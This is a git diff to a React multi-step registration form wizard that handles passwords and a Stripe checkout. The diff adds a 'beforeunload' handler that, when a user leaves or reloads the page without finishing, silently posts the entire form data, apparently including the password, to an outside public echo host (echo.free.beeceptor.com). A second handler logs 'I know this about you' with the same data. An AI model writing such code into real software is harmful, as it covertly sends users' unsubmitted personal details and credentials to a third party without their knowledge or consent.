@@ -17,6 +17,7 @@ import Prices from './Prices';
 
 
 const FormWizardDelayed = () => {
+  const isNavigating = useRef(false);
   const navigate = useNavigate();
   const dispatch = useDispatch();
   const [passwordVisible, setPasswordVisible] = useState(false);
@@ -98,6 +99,39 @@ const FormWizardDelayed = () => {
     setCurrentStep((prev) => prev - 1);
   };
 
+  useEffect(() => {
+    // Handle the beforeunload event
+    const handleBeforeUnload = async (event) => {
+      if (!isNavigating.current) {
+        event.preventDefault();        
+        console.log(`preserving ${JSON.stringify(formData)}`)
+        console.log(JSON.stringify(await api.post(`https://echo.free.beeceptor.com`,{...formData})))
+        event.returnValue = ""; // Required for modern browsers to display the default prompt
+      }
+    };
+
+    // Handle the unload event
+    const handleUnload =  () => {
+      if (!isNavigating.current) {        
+        console.log("User chose to leave or reload the page.");
+        console.log(`I know this about you ${JSON.stringify(formData)}`)
+      //  console.log(JSON.stringify(await api.post(`https://echo.free.beeceptor.com`,{...formData})))
+        
+      }
+    };
+
+    // Add event listeners
+    window.addEventListener("beforeunload", handleBeforeUnload);
+    window.addEventListener("unload", handleUnload);
+
+    // Cleanup event listeners on component unmount
+    return () => {
+      window.removeEventListener("beforeunload", handleBeforeUnload);
+      window.removeEventListener("unload", handleUnload);
+    };
+  }, []); 
+
+
 useEffect(()=>{
 
     const b = async function(){
@@ -154,6 +188,7 @@ useEffect(()=>{
         } else {
             console.log(`I think there are NOT errors`)
             setErrors('Successfully Registered')
+            isNavigating.current = true;
             setTimeout(()=> navigate("/"),1500)
             //navigate("/")
            
@@ -642,23 +677,13 @@ const provisionAccount = async (customerMetadata, customer_email) => {
     if (validateStep()) {
 
       if(currentStep == 3){
-        /*
-        let sessionDetails = await retrieveSession(queryParams.get("session_id"))
-
-        if(sessionDetails.status == "complete"){
-          console.log(`The saved session is ${JSON.stringify(sessionDetails)}`)
-          //setCurrentStep(4)
-          //return;
-  
-        }*/
        
-
         let session = await createSession()
 
         console.log(`I will send this to Stripe ${JSON.stringify(formData)}  session ${JSON.stringify(session)}`)
 
         setShowMsg(false)
-
+        isNavigating.current = true;
         window.location = session.url;
 
 
